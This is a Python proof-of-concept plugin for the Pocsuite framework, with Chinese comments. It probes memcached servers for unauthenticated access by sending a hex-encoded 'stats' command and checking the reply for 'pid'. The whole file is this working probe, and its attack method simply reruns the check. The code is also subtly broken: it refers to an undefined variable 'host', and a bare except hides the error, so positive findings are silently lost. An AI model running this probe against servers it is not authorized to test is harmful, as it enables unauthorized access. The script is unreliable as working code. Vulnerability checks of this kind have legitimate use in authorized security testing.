#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class MemcachePOC(POCBase):
    vulID = '21'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-12-12' #漏洞公开的时间,不知道就写今天

    author = 'colorway' #  PoC作者的大名
    createDate = '2017-12-12'# 编写 PoC 的日期
    updateDate = '2017-12-12'# PoC 更新的时间,默认和编写时间一样
    references = 'http://blog.nsfocus.net/memcache-unauthorized-access-exploit/'# 漏洞地址来源,0day不用写
    name = 'memcached Unauthorized access'# PoC 名称
    appPowerLink = 'http://memcached.org/'# 漏洞厂商主页地址
    appName = 'memcached'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        memcached未授权漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危

    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        import re
        #如果设置端口则取端口,没有设置则为默认端口
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 11211

        import socket
        payload = '\x73\x74\x61\x74\x73\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(3)
        #检测漏洞
        try:
            s.connect((_host, _port))
            s.send(payload)
            recvdata = s.recv(1024)
            #print recvdata
            if recvdata and 'pid' in recvdata:
                #print u'\n【警告】' + host + "【存在未授权访问】"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Payload'] = payload
            else:
                #print u'\n【不存在漏洞】 ' + host
                pass
        except:
            # return host
            pass
        s.close()
        print '[+]21 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(MemcachePOC)


